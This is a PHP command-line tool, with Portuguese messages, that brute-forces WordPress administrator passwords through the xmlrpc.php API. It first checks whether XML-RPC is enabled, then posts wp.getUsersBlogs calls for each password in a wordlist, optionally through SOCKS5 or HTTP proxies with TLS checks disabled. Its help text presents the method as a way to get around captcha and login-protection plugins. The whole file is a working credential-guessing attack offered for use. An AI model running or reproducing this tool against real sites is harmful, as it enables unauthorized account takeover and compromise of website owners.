<?php

error_reporting(0);

$b = "
+================================+
|                                |
| - Wordpress XMLRPC Bruteforcer |
|                                |
| - BY: D4RKR0N                  |
|                                |
| - Biblioteca usada: php-curl   |
|                                |
+================================+
";

if(isset($argv[1])){
     if($argv[1] == "-a"){
     	if(isset($argv[2])){
     		$alvo = $argv[2];
     		if(isset($argv[3])){
     			switch($argv[3]){
     			case "-x" : 
     			echo $b . "\n[+] Verificando se XMLRPC está habilitado em '$argv[2]'\n";
     			$xmlrpc = $alvo . "/xmlrpc.php";
     			$postdata = "<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>teste</value></param><param><value>teste</value></param></params></methodCall>";
     			$verificacao = curl_init();
     			curl_setopt($verificacao, CURLOPT_URL, $xmlrpc);
     			curl_setopt($verificacao, CURLOPT_RETURNTRANSFER, 1);
     			curl_setopt($verificacao, CURLOPT_USERAGENT, "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5");
     			curl_setopt($verificacao, CURLOPT_SSL_VERIFYHOST, FALSE);
     			curl_setopt($verificacao, CURLOPT_SSL_VERIFYPEER, FALSE);
     			curl_setopt($verificacao, CURLOPT_POST, TRUE);
     			curl_setopt($verificacao, CURLOPT_POSTFIELDS, $postdata);
     			$testar = curl_exec($verificacao);
     			$pegar = strstr($testar, "<int>405</int>", 1);
     			$info = curl_getinfo($verificacao);
     			if($pegar == "" AND $info['http_code'] == "200"){
     				echo "\n[+] YUUUUP, XMLRPC ATIVADO em $alvo, B).\n";
     			}elseif($info['http_code'] == "403"){
     				echo "\n[-] Acesso ao XMLRPC bloqueado ou pode ser que seu alvo tenha algum tipo de WAF.\n";
     			}elseif($pegar == "" AND $info['http_code'] == "404"){
     				echo "\n[-] XMLRPC não encontrado no path informado da aplicação.\n";
     			}elseif($info['http_code'] == 0){
                    echo "\n[-] Seu alvo pode estar fora do ar, ou o dominio não existe, ou problema em sua conexão.\n";
     		    }elseif($pos != 0){
     		    	echo "\n[-] XMLRPC desativado em $alvo, :(.\n";
     		    }else{
     		    	echo "\n[-] Erro desconhecido durante o teste... \n\n[-] Codigo HTTP retornado:" . $info['http_code'] . "\n";
     		    }
     		    break;
     		    case "-px" : 
                if(isset($argv[4])){
                	$p = $argv[4];
     		        $proxy = explode(":",$p);
     		        $proxyip = substr($proxy[1], 2);
     		        $proxyprotocolo = $proxy[0];
     		        $proxyporta = $proxy[2];
     		        switch($proxyprotocolo){
     		        	case "socks5":
     		        	echo $b . "\n[+] Verificando se XMLRPC está habilitado em '$argv[2]' (com o uso de proxy).\n";
     			$xmlrpc = $alvo . "/xmlrpc.php";
     			$postdata = "<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>teste</value></param><param><value>teste</value></param></params></methodCall>";
     			$verificacao = curl_init();
     			curl_setopt($verificacao, CURLOPT_URL, $xmlrpc);
     			curl_setopt($verificacao, CURLOPT_RETURNTRANSFER, 1);
     			curl_setopt($verificacao, CURLOPT_USERAGENT, "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5");
     			curl_setopt($verificacao, CURLOPT_PROXY, $p);
     			curl_setopt($verificacao, CURLOPT_SSL_VERIFYHOST, FALSE);
     			curl_setopt($verificacao, CURLOPT_SSL_VERIFYPEER, FALSE);
     			curl_setopt($verificacao, CURLOPT_POST, TRUE);
     			curl_setopt($verificacao, CURLOPT_POSTFIELDS, $postdata);
     			$testar = curl_exec($verificacao);
     			$pegar = strstr($testar, "<int>405</int>", 1);
     			$info = curl_getinfo($verificacao);
     			if($pegar == "" AND $info['http_code'] == "200"){
     				echo "\n[+] YUUUUP, XMLRPC ATIVADO em $alvo, B).\n";
     			}elseif($info['http_code'] == "403"){
     				echo "\n[-] Acesso ao XMLRPC bloqueado ou pode ser que seu alvo tenha algum tipo de WAF.\n";
     			}elseif($pegar == "" AND $info['http_code'] == "404"){
     				echo "\n[-] XMLRPC não encontrado no path informado da aplicação.\n";
     			}elseif($info['http_code'] == 0){
                    echo "\n[-] Seu alvo pode estar fora do ar, ou o dominio não existe, ou problema em sua conexão.\n";
     		    }elseif($pos != 0){
     		    	echo "\n[-] XMLRPC desativado em $alvo, :(.\n";
     		    }else{
     		    	echo "\n[-] Erro desconhecido durante o teste... \n\n[-] Codigo HTTP retornado:" . $info['http_code'] . "\n";
     		    }
     		    break; 
     		    case "https" : 
     		    echo $b . "\n[+] Verificando se XMLRPC está habilitado em '$argv[2]' (com o uso de proxy).\n";
     			$xmlrpc = $alvo . "/xmlrpc.php";
     			$postdata = "<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>teste</value></param><param><value>teste</value></param></params></methodCall>";
     			$verificacao = curl_init();
     			curl_setopt($verificacao, CURLOPT_URL, $xmlrpc);
     			curl_setopt($verificacao, CURLOPT_RETURNTRANSFER, 1);
     			curl_setopt($verificacao, CURLOPT_USERAGENT, "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5");
     			curl_setopt($verificacao, CURLOPT_PROXYTYPE, $proxyprotocolo);
     			curl_setopt($verificacao, CURLOPT_PROXY, $proxyip);
     			curl_setopt($verificacao, CURLOPT_PROXYPORT, $proxyporta);
     			curl_setopt($verificacao, CURLOPT_SSL_VERIFYHOST, FALSE);
     			curl_setopt($verificacao, CURLOPT_SSL_VERIFYPEER, FALSE);
     			curl_setopt($verificacao, CURLOPT_POST, TRUE);
     			curl_setopt($verificacao, CURLOPT_POSTFIELDS, $postdata);
     			$testar = curl_exec($verificacao);
     			$pegar = strstr($testar, "<int>405</int>", 1);
     			$info = curl_getinfo($verificacao);
     			if($pegar == "" AND $info['http_code'] == "200"){
     				echo "\n[+] YUUUUP, XMLRPC ATIVADO em $alvo, B).\n";
     			}elseif($info['http_code'] == "403"){
     				echo "\n[-] Acesso ao XMLRPC bloqueado ou pode ser que seu alvo tenha algum tipo de WAF.\n";
     			}elseif($pegar == "" AND $info['http_code'] == "404"){
     				echo "\n[-] XMLRPC não encontrado no path informado da aplicação.\n";
     			}elseif($info['http_code'] == 0){
                    echo "\n[-] Seu alvo pode estar fora do ar, ou o dominio não existe, ou problema em sua conexão.\n";
     		    }elseif($pos != 0){
     		    	echo "\n[-] XMLRPC desativado em $alvo, :(.\n";
     		    }else{
     		    	echo "\n[-] Erro desconhecido durante o teste... \n\n[-] Codigo HTTP retornado:" . $info['http_code'] . "\n";
     		    }
     		    break;
     		    case "http" : 
     		    echo $b . "\n[+] Verificando se XMLRPC está habilitado em '$argv[2]' (com o uso de proxy).\n";
     			$xmlrpc = $alvo . "/xmlrpc.php";
     			$postdata = "<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>teste</value></param><param><value>teste</value></param></params></methodCall>";
     			$verificacao = curl_init();
     			curl_setopt($verificacao, CURLOPT_URL, $xmlrpc);
     			curl_setopt($verificacao, CURLOPT_RETURNTRANSFER, 1);
     			curl_setopt($verificacao, CURLOPT_USERAGENT, "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5");
     			curl_setopt($verificacao, CURLOPT_PROXYTYPE, $proxyprotocolo);
     			curl_setopt($verificacao, CURLOPT_PROXY, $proxyip);
     			curl_setopt($verificacao, CURLOPT_PROXYPORT, $proxyporta);
     			curl_setopt($verificacao, CURLOPT_POST, TRUE);
     			curl_setopt($verificacao, CURLOPT_POSTFIELDS, $postdata);
     			$testar = curl_exec($verificacao);
     			$pegar = strstr($testar, "<int>405</int>", 1);
     			$pos = strpos($testar, "405");
     			$info = curl_getinfo($verificacao);
     			if($pegar == "" AND $info['http_code'] == "200"){
     				echo "\n[+] YUUUUP, XMLRPC ATIVADO em $alvo, B).\n";
     			}elseif($info['http_code'] == "403"){
     				echo "\n[-] Acesso ao XMLRPC bloqueado ou pode ser que seu alvo tenha algum tipo de WAF.\n";
     			}elseif($pegar == "" AND $info['http_code'] == "404"){
     				echo "\n[-] XMLRPC não encontrado no path informado da aplicação.\n";
     			}elseif($info['http_code'] == 0){
                    echo "\n[-] Seu alvo pode estar fora do ar, ou o dominio não existe, ou problema em sua conexão.\n";
     		    }elseif($pos != 0){
     		    	echo "\n[-] XMLRPC desativado em $alvo, :(.\n";
     		    }else{
     		    	echo "\n[-] Erro desconhecido durante o teste... \n\n[-] Codigo HTTP retornado:" . $info['http_code'] . "\n";
     		    }
     		    break;
     		    default : echo $b . "\n[-] Tipo proxy inválido, use apenas http,https ou socks5.\n";
               }
             }else{
             	echo $b . "\n[-] Digite seu proxy !!!\n";
             }
                break;
                case "-u" :
                if(isset($argv[4])){
                	$usuario = $argv[4];
                	if(isset($argv[5]) AND $argv[5] == "-w"){
                		if(isset($argv[6]) AND file_exists($argv[6])){
                			$s = file_get_contents($argv[6]);
                			$senhas = explode("\n",$s);
                			if(isset($argv[7]) AND $argv[7] == "-p"){
                				if(isset($argv[8])){
                					$proxy = explode(":",$argv[8]);
     		                        $proxyip = substr($proxy[1], 2);
     		                        $proxyprotocolo = $proxy[0];
     		                        $proxyporta = $proxy[2];
     		                        $problemas = 0;
                                    switch($proxyprotocolo){
                                    	case "socks5" : 
                                    		echo $b . "\n\n[+] Iniciando ataque de força bruta em $alvo via XMLRPC (com proxy)...\n\n";
                                    	foreach($senhas as $senha){
                                $postdata = "<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$usuario</value></param><param><value>$senha</value></param></params></methodCall>";
                                $xmlrpc = $alvo . "/xmlrpc.php"; 
                                $teste = curl_init();
                                curl_setopt($teste, CURLOPT_URL, $xmlrpc);
                                curl_setopt($teste, CURLOPT_RETURNTRANSFER, TRUE);
                                curl_setopt($teste, CURLOPT_USERAGENT, "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5");
                                curl_setopt($teste, CURLOPT_PROXY, $proxyprotocolo . "://" . $proxyip . ":$proxyporta");
                                curl_setopt($teste, CURLOPT_POST, TRUE);
                                curl_setopt($teste, CURLOPT_POSTFIELDS, $postdata);
                                curl_setopt($teste, CURLOPT_SSL_VERIFYPEER, FALSE);
                                curl_setopt($teste, CURLOPT_SSL_VERIFYHOST, FALSE);
                                $ir = curl_exec($teste);
                                $pegarr = curl_getinfo($teste);
                                $verificar = strpos($ir, "blogid");
                                $va = strstr($ir, "405", 1);
                                if($verificar == "" AND $pegarr['http_code'] == 200 AND $va == ""){
                                	echo "[-] FALHA: $usuario:$senha\n\n";
                                }elseif(!($verificar == "") AND $pegarr['http_code'] == 200 AND ($va == "")){
                                	echo "[+] SUCESSO: $usuario:$senha\n";
                                	exit;
                                }elseif($pegarr['http_code'] == "302"){
                                	echo "[-] Requisição retornada com codigo http 302 (redirecionamento).\n";
                                }elseif($pegarr['http_code'] == "403"){
                                	echo "[-][Codigo HTTP 403] - Acesso bloqueado ao XMLRPC, ou seu alvo está com algum tipo de WAF.\n";
                                	exit;
                                }elseif($pegarr['http_code'] == "301"){
                                	echo "[-] Requisição retornada com codigo http 301, certifique-se de que o path da aplicação wp está correto.\n";
                                }elseif($pegarr['http_code'] == "0"){
                                	echo "[-] Código 0 retornado, problemas de conexão com seu alvo.\n";
                                    if($problemas == 5){
                                    	echo "\n[-] 5 tentativas com problema de conexão, deseja continuar ou parar?[1=SIM|2=NAO]: ";
                                        $e = fopen("php://stdin","r"); $continuar = trim(fgets($e));
                                        while(!($continuar == 1) AND !($continuar == 2)){
                                        	echo "\n[-] Digite 1 para continuar e 2 para parar:\n";
                                        	$e = fopen("php://stdin","r"); $continuar = trim(fgets($e));
                                        }
                                        if($continuar == "1"){
                                        	$problemas = 0;
                                        }else{
                                        	echo "\nBye.\n";
                                        	exit;
                                        }
                                    }else{
                                    	$problemas = $problemas + 1;
                                    }
                                }elseif($pegarr['http_code'] == "404"){
                                	echo "[-] Código 404 retornado, path da aplicação errada ou o alvo está com algum tipo de proteçao.\n";
                                	exit;
                                }elseif(!($va == "")){
                                	echo "[-] XMLRPC desativado em seu alvo :(.\n";
                                	exit;
                                }
                			}
                			break;
                			case "http" : 
                                  echo $b . "\n\n[+] Iniciando ataque de força bruta em $alvo via XMLRPC (com proxy)...\n\n";
                                    	foreach($senhas as $senha){
                                $postdata = "<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$usuario</value></param><param><value>$senha</value></param></params></methodCall>";
                                $xmlrpc = $alvo . "/xmlrpc.php"; 
                                $teste = curl_init();
                                curl_setopt($teste, CURLOPT_URL, $xmlrpc);
                                curl_setopt($teste, CURLOPT_RETURNTRANSFER, TRUE);
                                curl_setopt($teste, CURLOPT_USERAGENT, "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5");
                                curl_setopt($teste, CURLOPT_PROXYTYPE, $proxyprotocolo);
                                curl_setopt($teste, CURLOPT_PROXY, $proxyip);
                                curl_setopt($teste, CURLOPT_PROXYPORT, $proxyporta);
                                curl_setopt($teste, CURLOPT_POST, TRUE);
                                curl_setopt($teste, CURLOPT_POSTFIELDS, $postdata);
                                curl_setopt($teste, CURLOPT_SSL_VERIFYPEER, FALSE);
                                curl_setopt($teste, CURLOPT_SSL_VERIFYHOST, FALSE);
                                $ir = curl_exec($teste);
                                $pegarr = curl_getinfo($teste);
                                $verificar = strpos($ir, "blogid");
                                $va = strstr($ir, "405", 1);
                                if($verificar == "" AND $pegarr['http_code'] == 200 AND $va == ""){
                                	echo "[-] FALHA: $usuario:$senha\n\n";
                                }elseif(!($verificar == "") AND $pegarr['http_code'] == 200 AND ($va == "")){
                                	echo "[+] SUCESSO: $usuario:$senha\n";
                                	exit;
                                }elseif($pegarr['http_code'] == "302"){
                                	echo "[-] Requisição retornada com codigo http 302 (redirecionamento).\n";
                                }elseif($pegarr['http_code'] == "403"){
                                	echo "[-][Codigo HTTP 403] - Acesso bloqueado ao XMLRPC, ou seu alvo está com algum tipo de WAF.\n";
                                	exit;
                                }elseif($pegarr['http_code'] == "301"){
                                	echo "[-] Requisição retornada com codigo http 301, certifique-se de que o path da aplicação wp está correto.\n";
                                }elseif($pegarr['http_code'] == "0"){
                                	echo "[-] Código 0 retornado, problemas de conexão com seu alvo.\n";
                                    if($problemas == 5){
                                    	echo "\n[-] 5 tentativas com problema de conexão, deseja continuar ou parar?[1=SIM|2=NAO]: ";
                                        $e = fopen("php://stdin","r"); $continuar = trim(fgets($e));
                                        while(!($continuar == 1) AND !($continuar == 2)){
                                        	echo "\n[-] Digite 1 para continuar e 2 para parar:\n";
                                        	$e = fopen("php://stdin","r"); $continuar = trim(fgets($e));
                                        }
                                        if($continuar == "1"){
                                        	$problemas = 0;
                                        }else{
                                        	echo "\nBye.\n";
                                        	exit;
                                        }
                                    }else{
                                    	$problemas = $problemas + 1;
                                    }
                                }elseif($pegarr['http_code'] == "404"){
                                	echo "[-] Código 404 retornado, path da aplicação errada ou o alvo está com algum tipo de proteçao.\n";
                                	exit;
                                }elseif(!($va == "")){
                                	echo "[-] XMLRPC desativado em seu alvo :(.\n";
                                	exit;
                                }                            
                			}
                			break;
                			case "https" : 
                			echo $b . "\n\n[+] Iniciando ataque de força bruta em $alvo via XMLRPC (com proxy)...\n\n";
                                    	foreach($senhas as $senha){
                                $postdata = "<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$usuario</value></param><param><value>$senha</value></param></params></methodCall>";
                                $xmlrpc = $alvo . "/xmlrpc.php"; 
                                $teste = curl_init();
                                curl_setopt($teste, CURLOPT_URL, $xmlrpc);
                                curl_setopt($teste, CURLOPT_RETURNTRANSFER, TRUE);
                                curl_setopt($teste, CURLOPT_USERAGENT, "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5");
                                curl_setopt($teste, CURLOPT_PROXYTYPE, $proxyprotocolo);
                                curl_setopt($teste, CURLOPT_PROXY, $proxyip);
                                curl_setopt($teste, CURLOPT_PROXYPORT, $proxyporta);
                                curl_setopt($teste, CURLOPT_POST, TRUE);
                                curl_setopt($teste, CURLOPT_POSTFIELDS, $postdata);
                                curl_setopt($teste, CURLOPT_SSL_VERIFYPEER, FALSE);
                                curl_setopt($teste, CURLOPT_SSL_VERIFYHOST, FALSE);
                                $ir = curl_exec($teste);
                                $pegarr = curl_getinfo($teste);
                                $verificar = strpos($ir, "blogid");
                                $va = strstr($ir, "405", 1);
                                if($verificar == "" AND $pegarr['http_code'] == 200 AND $va == ""){
                                	echo "[-] FALHA: $usuario:$senha\n\n";
                                }elseif(!($verificar == "") AND $pegarr['http_code'] == 200 AND ($va == "")){
                                	echo "[+] SUCESSO: $usuario:$senha\n";
                                	exit;
                                }elseif($pegarr['http_code'] == "302"){
                                	echo "[-] Requisição retornada com codigo http 302 (redirecionamento).\n";
                                }elseif($pegarr['http_code'] == "403"){
                                	echo "[-][Codigo HTTP 403] - Acesso bloqueado ao XMLRPC, ou seu alvo está com algum tipo de WAF.\n";
                                	exit;
                                }elseif($pegarr['http_code'] == "301"){
                                	echo "[-] Requisição retornada com codigo http 301, certifique-se de que o path da aplicação wp está correto.\n";
                                }elseif($pegarr['http_code'] == "0"){
                                	echo "[-] Código 0 retornado, problemas de conexão com seu alvo.\n";
                                    if($problemas == 5){
                                    	echo "\n[-] 5 tentativas com problema de conexão, deseja continuar ou parar?[1=SIM|2=NAO]: ";
                                        $e = fopen("php://stdin","r"); $continuar = trim(fgets($e));
                                        while(!($continuar == 1) AND !($continuar == 2)){
                                        	echo "\n[-] Digite 1 para continuar e 2 para parar:\n";
                                        	$e = fopen("php://stdin","r"); $continuar = trim(fgets($e));
                                        }
                                        if($continuar == "1"){
                                        	$problemas = 0;
                                        }else{
                                        	echo "\nBye.\n";
                                        	exit;
                                        }
                                    }else{
                                    	$problemas = $problemas + 1;
                                    }
                                }elseif($pegarr['http_code'] == "404"){
                                	echo "[-] Código 404 retornado, path da aplicação errada ou o alvo está com algum tipo de proteçao.\n";
                                	exit;
                                }elseif(!($va == "")){
                                	echo "[-] XMLRPC desativado em seu alvo :(.\n";
                                	exit;
                                }                         
                			}
                			break;
                			default :
                			echo $b . "\n[-] Você não informou um tipo de proxy válido, somente https, http ou socks5.\n ";
                                    }
                				}
                			}else{
                				echo $b . "\n[+] Iniciando ataque de força bruta em $alvo via XMLRPC...\n\n";
                			    $xmlrpc = $alvo . "/xmlrpc.php"; 
                			    foreach($senhas as $senha){
                                $postdata = "<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$usuario</value></param><param><value>$senha</value></param></params></methodCall>";
                                $teste = curl_init();
                                curl_setopt($teste, CURLOPT_URL, $xmlrpc);
                                curl_setopt($teste, CURLOPT_RETURNTRANSFER, TRUE);
                                curl_setopt($teste, CURLOPT_USERAGENT, "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5");
                                curl_setopt($teste, CURLOPT_POST, TRUE);
                                curl_setopt($teste, CURLOPT_POSTFIELDS, $postdata);
                                curl_setopt($teste, CURLOPT_SSL_VERIFYPEER, FALSE);
                                curl_setopt($teste, CURLOPT_SSL_VERIFYHOST, FALSE);
                                $ir = curl_exec($teste);
                                $pegarr = curl_getinfo($teste);
                                $verificar = strpos($ir, "blogid");
                                $va = strstr($ir, "405", 1);
                                $ir = curl_exec($teste);
                                $pegarr = curl_getinfo($teste);
                                $verificar = strpos($ir, "blogid");
                                $va = strstr($ir, "405", 1);
                                if($verificar == "" AND $pegarr['http_code'] == 200 AND $va == ""){
                                	echo "[-] FALHA: $usuario:$senha\n\n";
                                }elseif(!($verificar == "") AND $pegarr['http_code'] == 200 AND ($va == "")){
                                	echo "[+] SUCESSO: $usuario:$senha\n";
                                	exit;
                                }elseif($pegarr['http_code'] == "302"){
                                	echo "[-] Requisição retornada com codigo http 302 (redirecionamento).\n";
                                }elseif($pegarr['http_code'] == "403"){
                                	echo "[-][Codigo HTTP 403] - Acesso bloqueado ao XMLRPC, ou seu alvo está com algum tipo de WAF.\n";
                                	exit;
                                }elseif($pegarr['http_code'] == "301"){
                                	echo "[-] Requisição retornada com codigo http 301, certifique-se de que o path da aplicação wp está correto.\n";
                                }elseif($pegarr['http_code'] == "0"){
                                	echo "[-] Código 0 retornado, problemas de conexão com seu alvo.\n";
                                    if($problemas == 5){
                                    	echo "\n[-] 5 tentativas com problema de conexão, deseja continuar ou parar?[1=SIM|2=NAO]: ";
                                        $e = fopen("php://stdin","r"); $continuar = trim(fgets($e));
                                        while(!($continuar == 1) AND !($continuar == 2)){
                                        	echo "\n[-] Digite 1 para continuar e 2 para parar:\n";
                                        	$e = fopen("php://stdin","r"); $continuar = trim(fgets($e));
                                        }
                                        if($continuar == "1"){
                                        	$problemas = 0;
                                        }else{
                                        	echo "\nBye.\n";
                                        	exit;
                                        }
                                    }else{
                                    	$problemas = $problemas + 1;
                                    }
                                }elseif($pegarr['http_code'] == "404"){
                                	echo "[-] Código 404 retornado, path da aplicação errada ou o alvo está com algum tipo de proteçao.\n";
                                	exit;
                                }elseif(!($va == "")){
                                	echo "[-] XMLRPC desativado em seu alvo :(.\n";
                                	exit;
                                }
                			}
                		  }
                		}else{
                			echo $b . "\n[-] A wordlist informada não existe.\n";
                		}
                	}else{
                		echo $b . "\n[-] O quinto argumento deve ser -w para informar sua wordlist.\n";
                	}
                }else{
                	echo $b . "\n[-] Informe o usuário que deseja brutar.\n";
                }
                break;
     		    default:
     		    echo $b . "\n[-] Você não digitou um terceiro argumento válido.\n";
     		}
     		
     		}else{
     			echo $b . "\n[-] Digite o terceiro argumento.\n";
     		}

     	 }else{
     	 	echo $b . "\n[-] Você não informou seu alvo :/.\n";
     	 }
    }elseif($argv[1] == "-h"){
     	echo $b . "\nO que é o XMLRPC? \n\nXML-RPC é um recurso do WordPress que permite que dados sejam transmitidos, com HTTP agindo como mecanismo de transporte e XML como mecanismo de codificação. Como o WordPress não é um sistema “fechado” e, ocasionalmente, precisa se comunicar com outros sistemas, esse sistema foi feito para lidar com esse trabalho.
Por exemplo, digamos que você queira postar no seu site a partir do seu dispositivo móvel, já que está sem um computador. Você poderia usar o recurso de acesso remoto ativado por xmlrpc.php para fazer exatamente isso.
Com o xmlrpc.php habilitado, você consegue se conectar ao seu site via smartphone, implementando trackbacks e pingbacks de outros sites, e algumas funções associadas ao plugin Jetpack.\n\nFonte: https://www.hostinger.com.br/tutoriais/o-que-e-xmlrpc-php/\n\nSaiba mais sobre o uso do XMLRPC do Wordpress: https://codex.wordpress.org/XML-RPC_WordPress_API\n";
     }elseif($argv[1] == "-m"){
           echo $b . "\n Porque realizar bruteforce via XMLRPC no Wordpress? \n\n- Bom, existe X motivos para isso, existem muitos plugins que na pagina de login padrao do wp (wp-login.php) coloca meio que um terceiro form para + segurança, por exemplo aqueles perguntando resultado de contas matematicas ou também plugins que adicionam captcha na pagina administrativa, etc... Porém, no xmlrpc não tem isso, e mesmo os webmasters colocando esses plugins para mais segurança esquecem de desativar ou filtrar o acesso no xmlrpc, assim dando brecha para mesmo estando com meios de proteçao para bruteforce no wp-login.php, um hacker mal intencionado poder realizar bruteforce por essa api do wordpress.\n ";
     }else{
     	echo $b . "\n[-] Digite um argumento válido.\n";
     }
}else{
	echo $b . "\n[+] - Para saber o que é o XMLRPC do Wordpress: php $argv[0] -h\n\n[+] - Para verificar se o XMLRPC está ativado em seu alvo(sem proxy): php $argv[0] -a seu_alvo_aqui -x\n\n[+] - Para verificar se o XMLRPC está ativado em seu alvo(com proxy): php $argv[0] -a seu_alvo_aqui -px protocolo://ip:porta\n\n[+] - Realizar bruteforce sem proxy: php $argv[0] -a seu_alvo_aqui -u usuario -w lista\n\n[+] - Realizar bruteforce com proxy: php $argv[0] -a seu_alvo_aqui -u usuario -w lista -p protocolo://ip:porta\n\n[+] - Porque realizar bruteforce pelo XMLRPC: php $argv[0] -m
	";
}

?>
